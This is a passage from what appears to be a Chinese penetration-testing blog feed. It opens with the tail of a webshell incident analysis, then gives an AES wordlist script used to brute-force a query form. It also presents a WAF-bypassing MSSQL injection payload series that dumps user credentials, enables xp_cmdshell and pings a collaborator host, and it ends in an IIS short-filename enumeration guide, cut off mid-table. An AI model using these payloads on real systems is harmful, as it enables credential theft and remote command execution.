<h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>ps -aux | grep 5033 对应为 WEB 服务，猜测攻击者通过类似reGeorg 等工具代理流量，然后在本地发起暴力破解攻击。</p>
<h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><p><code>find  web目录路径 -ctime（-mtime） -7  -type f</code> ，查找7日内新增、改变的文件并进行分析。发现多个文件，涉及类型有 aar 包，冰蝎木马，reGeorg 流量代理工具等。</p>
<h3 id="WEB日志分析"><a href="#WEB日志分析" class="headerlink" title="WEB日志分析"></a>WEB日志分析</h3><h4 id="确认有哪些恶意文件？"><a href="#确认有哪些恶意文件？" class="headerlink" title="确认有哪些恶意文件？"></a>确认有哪些恶意文件？</h4><ol>
<li>通过find命令查找7日、30日之内变更、新增的文件。</li>
<li>通过河马、D盾对整个web目录进行扫描。</li>
<li>对筛选出来的文件再次进行人工审查，初步确认存在3个恶意文件，分别为 skin.jsp（reGeorg）、help.jsp（reGeorg）、j2ee.jsp（冰蝎）。</li>
</ol>
<h4 id="确认有多少个IP访问过恶意文件？"><a href="#确认有多少个IP访问过恶意文件？" class="headerlink" title="确认有多少个IP访问过恶意文件？"></a>确认有多少个IP访问过恶意文件？</h4><p><code>grep -ie &quot;skin.jsp\|help.jsp\|j2ee.jsp&quot; localhost_access_log* | awk &#39;&#123;print $1&#125;&#39; | sort | uniq -c</code> ，发现共15个IP访问过恶意文件。</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>IP</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>112.96.67.7</td>
</tr>
<tr>
<td>2</td>
<td>13.234.116.183</td>
</tr>
<tr>
<td>3</td>
<td>58.62.206.235</td>
</tr>
<tr>
<td>4</td>
<td>58.62.206.249</td>
</tr>
<tr>
<td>5</td>
<td>112.96.195.23</td>
</tr>
<tr>
<td>6</td>
<td>120.235.159.163</td>
</tr>
<tr>
<td>7</td>
<td>120.239.76.89</td>
</tr>
<tr>
<td>8</td>
<td>223.104.66.68</td>
</tr>
<tr>
<td>9</td>
<td>112.96.193.140</td>
</tr>
<tr>
<td>10</td>
<td>120.235.159.189</td>
</tr>
<tr>
<td>11</td>
<td>120.235.159.246</td>
</tr>
<tr>
<td>12</td>
<td>223.104.63.106</td>
</tr>
<tr>
<td>13</td>
<td>45.66.134.61</td>
</tr>
<tr>
<td>14</td>
<td>112.96.173.19</td>
</tr>
<tr>
<td>15</td>
<td>117.136.41.37</td>
</tr>
</tbody></table>
<h4 id="确认这些IP中第一个访问系统的IP是什么？"><a href="#确认这些IP中第一个访问系统的IP是什么？" class="headerlink" title="确认这些IP中第一个访问系统的IP是什么？"></a>确认这些IP中第一个访问系统的IP是什么？</h4><p><code>grep -m1  &quot;112.96.67.7/|13.234.116.183.....&quot;   localhost_access_log*</code>，发现58.62.206.249为第一个访问系统的IP，访问时间为：11&#x2F;May&#x2F;2021:12:15:23</p>
<h4 id="确认这些IP访问过什么文件，发送过什么请求包？"><a href="#确认这些IP访问过什么文件，发送过什么请求包？" class="headerlink" title="确认这些IP访问过什么文件，发送过什么请求包？"></a>确认这些IP访问过什么文件，发送过什么请求包？</h4><ol>
<li><code>grep -ie &quot;IP地址.*\s200\s.*&quot; localhost_access_log* | awk &#39;&#123;print $7&#125;&#39; |awk -F &#39;?&#39; &#39;&#123;print $1&#125;&#39; | sort | uniq -c | sort -rnk 1</code> ，查询成功访问的uri资源，发现对含有AxisInvoker的路径访问频繁; </li>
<li><code>grep -ie &quot;IP地址.*AxisInvoker.*\s200\s.*&quot; localhost_access_log* | awk &#39;&#123;print $7&#125;&#39; | sort | uniq -c | sort -rnk 1</code> ，排查 AxisInvoker，检查方法参数，分析攻击者操作，发现该文件对应7天内新增的 AxisInvoker.aar 包，是后门程序，攻击者通过该后门程序写入skin.jsp（reGeorg）、help.jsp（reGeorg）、j2ee.jsp（冰蝎），反弹shell等。</li>
</ol>
<h4 id="确认什么时候第一次获取控制权？"><a href="#确认什么时候第一次获取控制权？" class="headerlink" title="确认什么时候第一次获取控制权？"></a>确认什么时候第一次获取控制权？</h4><ol>
<li><code>grep -m1 -c10 -ie &quot;AxisInvoker&quot;  localhost_access_log*</code>，发现第一次出现 AxisInvoker 记录的 IP：<code>58.62.206.249</code>，出现时间：<code>11/May/2021:13:39:08</code>，对上一条日志记录为 <code>/r1/axis2-admin/upload</code></li>
<li>检查第一次访问系统时间：<code>11/May/2021:12:15:23</code> 与第一次出现 AxisInvoker 记录：<code>11/May/2021:13:39:08</code> 之间的日志，未发现其他异常的情况。</li>
<li>综上，判断攻击者登陆了 axis2 后台，并通过后台部署AxisInvoker.aar 包，获取控制权限，初次获取控制权限的时间为：<code>11/May/2021:13:39:08</code>。</li>
</ol>
<h2 id="分析结果"><a href="#分析结果" class="headerlink" title="分析结果"></a>分析结果</h2><p>经分析整理，本次信息安全事件是由 axis 管理后台存在弱口令漏洞导致。攻击者通过 axis 弱口令登录管理后台，在管理后台部署恶意aar包获取控制权限。后续则通过上传冰蝎木马，reGeorg 流量代理工具等进一步控制服务器并开展横向渗透攻击。
 </p>
]]></content>
  </entry>
  <entry>
    <title>暴力破解之前端AES加密</title>
    <url>/2022/03/18/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E4%B9%8B%E5%89%8D%E7%AB%AFAES%E5%8A%A0%E5%AF%86/</url>
    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01-前言</h2><p>某次测试中遇到一个信息泄露漏洞。页面提供一个查询功能，用户需要填写两个或三个参数值，且参数值正确才能返回相关信息。在测试中，发现仅需提供一个参数值即可以返回相关信息。如在提供<em><strong>姓名输入框</strong></em>中填入：“吴翠”，即可返回“吴翠”的相关信息。</p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220318120459.png"></p>
<h2 id="0x02-AES加密的参数"><a href="#0x02-AES加密的参数" class="headerlink" title="0x02-AES加密的参数"></a>0x02-AES加密的参数</h2><p>测试过程中，发现参数值经过加密，翻查JS文件，确认是AES加密。<br>一开始的想法是使用 Burpsuite 的 <code>JS Rainbow</code> 插件加载JS文件，自动执行加密函数加密参数值进行爆破，后发现导入字典测试的时候，由于字典内容为中文，会导致加密结果与预期不一致，后端无法解析加密后的数据，导致查询失败。<br>后续尝试使用 <code>BurpCrypto</code>、<code>AES KILLER</code>等 Burpsuite 插件时均与上面情况一样，中文内容加密与预期不一致。估计是由于 Burpsuite 软件自身问题。<br>再后使用 python 写个小程序，将字典加密，将加密结果作为字典导入 Burpsuite 爆破才成功。</p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220318122718.png"></p>
<p><strong>加密小程序源代码</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">text</span>):</span><br><span class="line">    key = <span class="string">b&#x27;FC5E8DF8BB4A2F78&#x27;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = <span class="string">b&#x27;!1@2#3$4%5^6&amp;7*8&#x27;</span></span><br><span class="line">    cryptos = AES.new(key, mode, iv)</span><br><span class="line">    padtext=pad(text,<span class="number">16</span>,style=<span class="string">&#x27;pkcs7&#x27;</span>)</span><br><span class="line">    cipherText=cryptos.encrypt(padtext)</span><br><span class="line">    <span class="keyword">return</span> base64.encodebytes(cipherText)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;500.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> fs.readlines():</span><br><span class="line">            name = <span class="built_in">bytes</span>(line.strip(),encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">            e = encrypt(name)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(e.strip(), encoding = <span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>WEB安全</tag>
        <tag>暴力破解</tag>
        <tag>AES</tag>
      </tags>
  </entry>
  <entry>
    <title>某CDN SQLi注入Bypass</title>
    <url>/2022/03/19/%E6%9F%90CDN-SQLi%E6%B3%A8%E5%85%A5Bypass/</url>
    <content><![CDATA[<h2 id="0x01-前言："><a href="#0x01-前言：" class="headerlink" title="0x01 前言："></a>0x01 前言：</h2><p>某次测试，发现目标存在 SQLi 注入漏洞，站点采用某信服CDN，且提供防护功能。由于无法找到真实IP地址，遂有本次测试。</p>
<h2 id="0x02-Payload"><a href="#0x02-Payload" class="headerlink" title="0x02 Payload"></a>0x02 Payload</h2><p>目标站点信息一览表</p>
<ul>
<li>中间件：IIS</li>
<li>数据库：MSSQL</li>
<li>脚本语言：aspx</li>
</ul>
<h3 id="Payload："><a href="#Payload：" class="headerlink" title="Payload："></a>Payload：</h3><h4 id="绕过-union-selec-常规函数-："><a href="#绕过-union-selec-常规函数-：" class="headerlink" title="绕过 union selec+常规函数 ："></a>绕过 <code>union selec+常规函数</code> ：</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2 union--^!~%*/%0b/*%0aall select--^!~%*/%0b%0anull,null,null,null,db_name--%0a(),2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--</span></span><br></pre></td></tr></table></figure>

<h4 id="绕过-union-select-x-from-x-："><a href="#绕过-union-select-x-from-x-：" class="headerlink" title="绕过 union select x from x ："></a>绕过 <code>union select x from x </code>：</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2 union--^!~%*/%0b/*%0aall(select--^!~%*/%0b/*%0anull,null,null,null,1,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--^!~%*/%0b/*%0afrom--^!~%*/%0b/*%0ax)--</span></span><br></pre></td></tr></table></figure>

<h4 id="绕过-union-all-select-x-from-x-："><a href="#绕过-union-all-select-x-from-x-：" class="headerlink" title="绕过 union all select x from x ："></a>绕过 <code>union all select x from x</code> ：</h4><p><strong>查表名：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2 union--^!~%*/%0b%0aall(--^!~%*/%0b%0aselect--^!~%*/%0b/*%0anull,null,null,null,name,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--^!~%*/%0b%0afrom--/*^~%%0bx*/%0asysobjects)--</span></span><br></pre></td></tr></table></figure>

<p><strong>查字段名：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2%20union--^!~%*/%0b%0aall(--^!~%*/%0b%0aselect--^!~%*/%0b/*%0anull,null,null,null,COLUMN_NAME,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--^!~%*/%0b%0afrom--/*^~%%0bx*/%0ainformation_schema.COLUMNS where TABLE_NAME=&#x27;</span>sys_User<span class="string">&#x27;)--</span></span><br></pre></td></tr></table></figure>

<p><strong>查数据：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2%20union--^!~%*/%0b%0aall(--^!~%*/%0b%0aselect--^!~%*/%0b/*%0anull,null,null,null,U_LoginName,U_Password ,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--^!~%*/%0b%0afrom--/*^~%%0bx*/%0asys_User)--</span></span><br></pre></td></tr></table></figure>

<p><strong>开启xp_cmdshell：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2%20union--^!~%*/%0b/*%0aall%20select--^!~%*/%0b%0anull,null,null,null,SERVERPROPERTY--%0a(%27MachineName%27),2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null;EXEC--^!~%*/%0b%0asp_configure &#x27;</span><span class="keyword">show</span> advanced options<span class="string">&#x27;, 1;RECONFIGURE;EXEC--^!~%*/%0b%0asp_configure &#x27;</span>xp_cmdshell<span class="string">&#x27;, 1;RECONFIGURE;</span></span><br></pre></td></tr></table></figure>

<p><strong>执行ping命令测试：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2%20union--^!~%*/%0b/*%0aall%20select--^!~%*/%0b%0anull,null,null,null,SERVERPROPERTY--%0a(%27MachineName%27),2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null;exec--^!~%*/%0b%0amaster..xp_cmdshell%20%27ping%20hn81hzwt1rqcgj20qnh50is0drjh76.burpcollaborator.net%27--</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
        <tag>注入</tag>
        <tag>bypass</tag>
        <tag>CDN</tag>
        <tag>WAF</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试之短文件名漏洞</title>
    <url>/2022/03/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="渗透测试之短文件名漏洞"><a href="#渗透测试之短文件名漏洞" class="headerlink" title="渗透测试之短文件名漏洞"></a>渗透测试之短文件名漏洞</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01-前言</h2><p>某次测试，使用 dirsearch 对网站目录进行扫描，突然发现一个终端出现一个奇怪的路径： <code>index~1</code> ，且响应码为 200。访问后发现该文件为 index 备份文件，浏览器直接显示文件源码。真奇怪啊，真奇怪。后面百度发现，<code>Apache + Windows</code> 组合，会存在短文件名下载漏洞。参考网上内容，整理合并资料，遂有下文。</p>
<h2 id="0x02-Windows-Apache-x3D-短文件名任意文件下载"><a href="#0x02-Windows-Apache-x3D-短文件名任意文件下载" class="headerlink" title="0x02-Windows + Apache &#x3D; 短文件名任意文件下载"></a>0x02-Windows + Apache &#x3D; 短文件名任意文件下载</h2><p>Windows下采用了短文件名机制，如</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\wooyun12312394944545.txt</span><br></pre></td></tr></table></figure>

<p>可采用如下方式访问</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\wooyun~1.txt</span><br></pre></td></tr></table></figure>

<p>假如web应用程序中存在一个备份文件，文件名是这样的：<code>http://127.0.0.1/admin/databack/sql/metinfo_met_20140202_ixzlfo_1.zip</code>。当目标站点为 windows + apache(影响版本范围不确认，网上说 Apache 服务器默认支持短文件名访问) 的时候，我们就可以通过短文件名的方式直接下载文件：<code>http://127.0.0.1/admin/databack/sql/metinf~1.zip</code></p>
<p><strong>漏洞证明：</strong></p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220324165011.png"></p>
<p><em>PS : IIS 下不允许使用短文件来访问资源，而 Apache 支持短文件名来访问资源，因此上面介绍的任意文件下载只能适应于 windows 系统下的 Apache 搭建的网站中（Tomcat 也不支持使用短文件名来访问资源）。IIS 中虽然不能利用短文件名来访问资源，但是存在 IIS 短文件泄露漏洞，可以利用短文件名来猜测网站目录下的文件和目录名</em></p>
<h2 id="0x03-IIS-短文件名"><a href="#0x03-IIS-短文件名" class="headerlink" title="0x03-IIS 短文件名"></a>0x03-IIS 短文件名</h2><h3 id="IIS短文件漏洞的由来"><a href="#IIS短文件漏洞的由来" class="headerlink" title="IIS短文件漏洞的由来"></a>IIS短文件漏洞的由来</h3><p>Microsoft IIS 短文件&#x2F;文件夹名称信息泄漏最开始由Vulnerability Research Team（漏洞研究团队）的Soroush Dalili在2010年8月1日发现，并于2010年8月3日通知供应商（微软公司）。微软公司分别于2010年12月1日和2011年1月4日给予答复下个版本修复。2012年6月29日，此漏洞公开披露（中危）。</p>
<p>此漏洞实际是由HTTP请求中旧 <code>DOS 8.3</code> 名称约定（SFN）的代字符（<code>〜</code>）波浪号引起的。它允许远程攻击者在Web根目录下公开文件和文件夹名称（不应该可被访问）。攻击者可以找到通常无法从外部直接访问的重要文件，并获取有关应用程序基础结构的信息。</p>
<p>Microsoft IIS 波浪号造成的信息泄露是世界网络范围内最常见的中等风险漏洞。这个问题至少从1990年开始就已经存在，但是已经证明难以发现，难以解决或容易被完全忽略。</p>
<h3 id="IIS短文件漏洞影响范围及危害"><a href="#IIS短文件漏洞影响范围及危害" class="headerlink" title="IIS短文件漏洞影响范围及危害"></a>IIS短文件漏洞影响范围及危害</h3><h4 id="受影响的版本"><a href="#受影响的版本" class="headerlink" title="受影响的版本"></a>受影响的版本</h4><blockquote>
<p>IIS 1.0，Windows NT 3.51<br>IIS 3.0，Windows NT 4.0 Service Pack 2<br>IIS 4.0，Windows NT 4.0选项包<br>IIS 5.0，Windows 2000<br>IIS 5.1，Windows XP Professional和Windows XP Media Center Edition<br>IIS 6.0，Windows Server 2003和Windows XP Professional x64 Edition<br>IIS 7.0，Windows Server 2008和Windows Vista<br>IIS 7.5，Windows 7（远程启用<customErrors>或没有web.config）<br>IIS 7.5，Windows 2008（经典管道模式）<br>IIS 8.0，Windows 8, Windows Server 2012<br>IIS 8.5，Windows 8.1,Windows Server 2012 R2<br>IIS 10.0，Windows 10, Windows Server 2016</p>
</blockquote>
<h4 id="支持方法"><a href="#支持方法" class="headerlink" title="支持方法"></a>支持方法</h4><p>DEBUG、OPTIONS、GET、POST、HEAD、TRACE<br><strong>IIS 7.5(Windows 2008 R2)</strong> 和 <strong>IIS 8.0(Windows 2012)</strong> 过程中，当使用 OPTIONS 来代替 GET 方法时，如果请求中的短文件名是存在的，IIS就会返回一个不一样的错误信息。<strong>IIS 8.0</strong>、<strong>IIS 8.5</strong> 和 <strong>IIS 10.0</strong> 的短文件名称均可以通过OPTIONS和TRACE方法被猜测成功。</p>
<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ol>
<li>利用 <code>~</code> 字符猜解暴露短文件&#x2F;文件夹名（主要危害）</li>
<li>Net Framework 的拒绝服务攻击 （副危害）：<br>据Soroush Dalili在研究表明，攻击者如果在文件夹名称中向发送一个不合法的.Net文件请求，.NeFramework将递归搜索所有的根目录，消耗网站资源进而导致DOS问题。微软认为此危害是可恢复的DOS，将在后续SP版本修改，此处不做探讨研究。</li>
</ol>
<h4 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h4><ol>
<li>只有前六位字符直接显示，后续字符用 ~1 指代。其中数字 1 还可以递增，如果存在多个文件名类似的文件（名称前6位必须相同，且后缀名前3位必须相同）；</li>
<li>后缀名最长只有 3 位，多余的被截断，超过 3 位的长文件会生成短文件名；</li>
<li>所有小写字母均转换成大写字母；</li>
<li>长文件名中含有多个“.”，以文件名最后一个“.”作为短文件名后缀；</li>
<li>长文件名前缀&#x2F;文件夹名字符长度符合 0-9 和 Aa-Zz 范围且需要大于等于 9 位才会生成短文件名，如果包含空格或者其他部分特殊字符，不论长度均会生成短文件。</li>
</ol>
<p>我们可以在启用 .net 的 IIS 下使用GET方法暴力列举短文件名，原因是攻击者使用通配符 <code>*</code> 和 <code>?</code> 发送一个请求到 IIS,当 IIS 接收到一个文件路径中包含 <code>~</code> 请求时，它的反应是不同的，即返回的 HTTP 状态码和错误信息不同。基于这个特点，可以根据 HTTP 的响应区分一个可用或者不可用的文件。如下表所示不同 IIS 版本返回信息的不同：</p>
<p><strong>IIS 5.0 ~ IIS 7.X短文件猜解HTTP响应信息：访问构造的某个存在的短文件名，会返回404；访问构造的某个不存在的短文件名，会返回400。</strong></p>
<table>
<thead>
<tr>
<th>IIS VERSION</th>
<th>URL</th>
<th>Result&#x2F;Error Message</th>
</tr>
</thead>
<tbody><tr>
<td>IIS 6</td>
<td>&#x2F;valid*~1*&#x2F;.aspx</td>
<td>HTTP 404 - File not found</td>
</tr>
<tr>
<td>IIS 6</td>
<td>&#x2F;Invalid*~1*&#x2F;.aspx</td>
<td>HTTP 400 - Bad Request</td>
</tr>
<tr>
<td>IIS 5.X</td>
<td>&#x2F;valid*~1*</td>
<td>HTTP 404 - File not found</td>
</tr>
<tr>
<td>IIS 5.X</td>
<td>&#x2F;Invalid*~1*</td>
<td>HTTP 400 - Bad Request</td>
</tr>
<tr>
<td>IIS 7.X.NET.2(No Error Handling)</td>
<td>&#x2F;valid*~1*&#x2F;</td>
<td>Page contains: “Error Code 0x00000000”</td>
</tr>
<tr>
<td>IIS 7.X.NET.2(No Error Handling)</td>
<td>&#x2F;Invalid*~1*&#x2F;</td>
<td>Page contains: “Error Code 0x80070002”</td>
</tr>
</tbody></table>
<p><strong>IIS 状态码猜解过程：IIS较低版本+ASP.NET 环境下使用GET方法反复循环猜测，直到猜解出短文件名</strong></p>
<table>
<thead>
<tr>
<th>URL</th>
<th>Result</th>
</tr>
</thead>
<tbody><tr>
<td><a href="http://sdl.me/*~1*/.aspx">http://sdl.me/*~1*/.aspx</a></td>
<td>404. Valid: one or more file(s)&#x2F;folder(s) with short name is&#x2F;are available on the server</td>
</tr>
<tr>
<td><a href="http://sdl.me/a*~1*/.aspx">http://sdl.me/a*~1*/.aspx</a></td>
<td>404 - Valid: It starts with“A”</td>
</tr>
<tr>
<td><a href="http://sdl.me/aa*~1*/.aspx">http://sdl.me/aa*~1*/.aspx</a></td>
<td>400 - Invalid: The second letter is not“A”</td>
</tr>
<tr>
<td><a href="http://sdl.me/ab*~1*/.aspx">http://sdl.me/ab*~1*/.aspx</a></td>
<td>400 - Invalid: The second letter is not“B”</td>
</tr>
<tr>
<td><a href="http://sdl.me/ac*~1*/.aspx">http://sdl.me/ac*~1*/.aspx</a></td>
<td>404 - Valid: The second letter is “C”</td>
</tr>
<tr>
<td><a href="http://sdl.me/ac%3f~1*/.aspx">http://sdl.me/ac%3f~1*/.aspx</a></td>
<td>400 - Invalid: It has more than three characters</td>
</tr>
<tr>
<td><a href="http://sdl.me/ac%3f%3f%3f%3f~1/*/.aspx">http://sdl.me/ac%3f%3f%3f%3f~1\*/.aspx</a></td>
<td>404 - Valid: It has 6 or more than 6 characters</td>
</tr>
<tr>
<td><a href="http://sdl.me/acsecr~1*/.aspx">http://sdl.me/acsecr~1*/.aspx</a></td>
<td>404 - Valid: It starts with“ACSECR”</td>
</tr>
<tr>
<td><a href="http://sdl.me/acsecr/~1/.aspx">http://sdl.me/acsecr\~1/.aspx</a></td>
<td>400 - Invalid: It is not a folder and it has an extension</td>
</tr>
<tr>
<td><a href="http://dl.me/acsecr~1.%3f/.aspx">http://dl.me/acsecr~1.%3f/.aspx</a></td>
<td>400- Invalid: Extension has more than 1 character</td>
</tr>
<tr>
<td><a href="http://sdl.me/acsecr~1.%3f%3f%3f/.aspx">http://sdl.me/acsecr~1.%3f%3f%3f/.aspx</a></td>
<td>404 - Valid: Extension has 3 or more characters</td>
</tr>
<tr>
<td><a href="http://sdl.me/acsecr~1.a%3f%3f/.aspx">http://sdl.me/acsecr~1.a%3f%3f/.aspx</a></td>
<td>400 - Invalid: Extension does not start with“A”</td>
</tr>
<tr>
<td><a href="http://sdl.me/acsecr~1.h%3f%3f/.aspx">http://sdl.me/acsecr~1.h%3f%3f/.aspx</a></td>
<td>404 - Valid: Extension starts with“H”</td>
</tr>
<tr>
<td><a href="http://sdl.me/acsecr~1.htm/.aspx">http://sdl.me/acsecr~1.htm/.aspx</a></td>
<td>404 - Valid: Extension starts with“HTM”</td>
</tr>
</tbody></table>
<p>但是千里目实验室在真实环境验证发现，在IIS高版本（如：IIS 8.0&#x2F;IIS 8.5&#x2F;IIS 10.0），即使没有安装asp.net，通过 <code>OPTIONS</code> 和 <code>TRACE</code> 方法也可以猜解成功。这两种方法猜解返回的HTTP状态码类型和上述表格内容表有些许出入，但是不失为另一种利用方式。</p>
<p><strong>IIS 10.0 短文件猜解过程分析</strong></p>
<table>
<thead>
<tr>
<th>序号</th>
<th>原始扫描包URL解码</th>
<th>HTTP状态码</th>
<th>状态码含义</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>OPTIONS &#x2F;*~1*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
<td>404</td>
<td>猜测成功，存在短文件漏洞</td>
</tr>
<tr>
<td>2</td>
<td>OPTIONS &#x2F;?*~1*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
<td>404</td>
<td>猜测成功，存在1个及以上字母开头的文件</td>
</tr>
<tr>
<td>3</td>
<td>OPTIONS &#x2F;*T*~1*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
<td>404</td>
<td>猜测成功，文件名中包含字母T</td>
</tr>
<tr>
<td>4</td>
<td>OPTIONS &#x2F;*~1.*T*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
<td>404</td>
<td>猜测成功，文件后综名包含字母T</td>
</tr>
<tr>
<td>5</td>
<td>OPTIONS &#x2F;*S*~1*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
<td>404</td>
<td>猜测成功，文件名中包含字母S</td>
</tr>
<tr>
<td>6</td>
<td>OPTIONS &#x2F;*~1.*H*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
<td>404</td>
<td>猜测成功，文件后缀名包含字母H</td>
</tr>
<tr>
<td>7</td>
<td>OPTIONS &#x2F;*~1.*M*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
<td>404</td>
<td>猜测成功，文件后缀名包含字母M</td>
</tr>
<tr>
<td>8</td>
<td>OPTIONS &#x2F;*0*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名中包含数字0</td>
</tr>
<tr>
<td>9</td>
<td>OPTIONS &#x2F;*1*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名中包含数字1</td>
</tr>
<tr>
<td>10</td>
<td>OPTIONS &#x2F;I*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>猜测成功，文件名中包含字母I开头文件</td>
</tr>
<tr>
<td>11</td>
